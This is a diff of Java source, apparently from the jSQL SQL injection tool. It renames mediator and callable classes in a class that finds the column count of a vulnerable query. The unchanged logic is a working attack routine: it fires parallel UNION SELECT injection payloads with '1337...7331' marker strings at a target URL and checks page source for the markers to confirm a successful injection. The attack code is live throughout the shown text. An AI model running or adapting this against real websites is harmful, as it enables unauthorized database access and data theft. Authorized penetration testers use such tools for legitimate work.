@@ -11,7 +11,7 @@ import org.apache.log4j.Logger;
 
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
-import com.jsql.view.GUIMediator;
+import com.jsql.view.MediatorGUI;
 
 /**
  * Runnable class, search the correct number of fields in the SQL query.
@@ -27,7 +27,7 @@ public class StoppableGetInitialQuery extends AbstractSuspendable {
     public String action(Object... args) throws PreparationException, StoppableException {
         // Parallelize the search
         ExecutorService taskExecutor = Executors.newCachedThreadPool();
-        CompletionService<SourceCodeCallable> taskCompletionService = new ExecutorCompletionService<SourceCodeCallable>(taskExecutor);
+        CompletionService<CallableSourceCode> taskCompletionService = new ExecutorCompletionService<CallableSourceCode>(taskExecutor);
 
         boolean requestFound = false;
         String selectFields, initialQuery = "";
@@ -37,7 +37,7 @@ public class StoppableGetInitialQuery extends AbstractSuspendable {
         // Search if the source contains 1337[index]7331, this notation allows to exclude
         // pages that display our own url in the source
         for (selectIndex = 1, selectFields = "133717330%2b1"; selectIndex <= 10; selectIndex++, selectFields += ",1337" + selectIndex + "7330%2b1") {
-            taskCompletionService.submit(new SourceCodeCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
+            taskCompletionService.submit(new CallableSourceCode(MediatorGUI.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
         }
 
         int total = 10;
@@ -50,18 +50,18 @@ public class StoppableGetInitialQuery extends AbstractSuspendable {
                     throw new StoppableException();
                 }
 
-                SourceCodeCallable currentCallable = taskCompletionService.take().get();
+                CallableSourceCode currentCallable = taskCompletionService.take().get();
 
                 // Found a correct mark 1337[index]7331 in the source
                 if (Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.getContent()).matches()) {
-                    GUIMediator.model().firstSuccessPageSource = currentCallable.getContent();
+                    MediatorGUI.model().firstSuccessPageSource = currentCallable.getContent();
                     initialQuery = currentCallable.getUrl().replaceAll("0%2b1", "1");
                     requestFound = true;
                     // Else add a new index
                 } else {
                     selectIndex++;
                     selectFields += ",1337" + selectIndex + "7330%2b1";
-                    taskCompletionService.submit(new SourceCodeCallable(GUIMediator.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
+                    taskCompletionService.submit(new CallableSourceCode(MediatorGUI.model().insertionCharacter + "+union+select+" + selectFields + "--+", Integer.toString(selectIndex)));
                     total++;
                 }
             }
